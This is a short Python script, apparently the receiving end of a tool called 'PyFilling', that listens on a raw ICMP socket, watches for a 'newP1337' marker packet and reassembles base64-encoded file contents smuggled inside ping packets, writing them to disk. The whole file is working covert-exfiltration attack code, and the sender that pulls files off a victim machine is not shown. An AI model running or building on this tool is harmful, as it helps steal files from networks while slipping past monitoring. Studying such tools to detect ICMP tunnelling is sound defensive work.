import socket
import struct
import base64

def write_file(file_name, file_contents): 
  fp = open(str(file_name), 'w+') 
  contents = fp.write(file_contents)
  print("File: \'" + file_name + "\' written locally")
  fp.close()

def start_listener(host):
    print(""" 
      _____      _________ _ _ _            
     |  __ \     |  ____(_) | (_)            
     | |__) |   _| |__   _| | |_ _ __   __ _ 
     |  ___/ | | |  __| | | | | | '_ \ / _` |
     | |   | |_| | |    | | | | | | | | (_| |
     |_|    \__, |_|    |_|_|_|_|_| |_|\__, |
             __/ |                      __/ |
            |___/                      |___/ """)
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    s.bind((host, 1337)) #Binding port doesn't seem to do anything as this is an ICMP socket

    while 1:
      print("Listening for ICMP traffic")
      recPacket = s.recv(128)
      icmp_data = recPacket[36:] # Offset 36 where the data starts

      try:
        new_flag, file_path, packet_number = base64.b64decode(icmp_data.decode("utf-8")).decode("utf-8").split(";")
      
        if new_flag == "newP1337":
          file_contents = ""

          file_name = file_path.split("/")[-1]

          for i in range(int(packet_number)):
            receivedPacket = s.recv(1028)
            icmp_data_exfil = base64.b64decode(receivedPacket[36:]).decode("utf-8")
            file_contents += icmp_data_exfil
            
          write_file(file_name, file_contents)

      except:
        pass

if __name__ == "__main__":
    start_listener("127.0.0.1")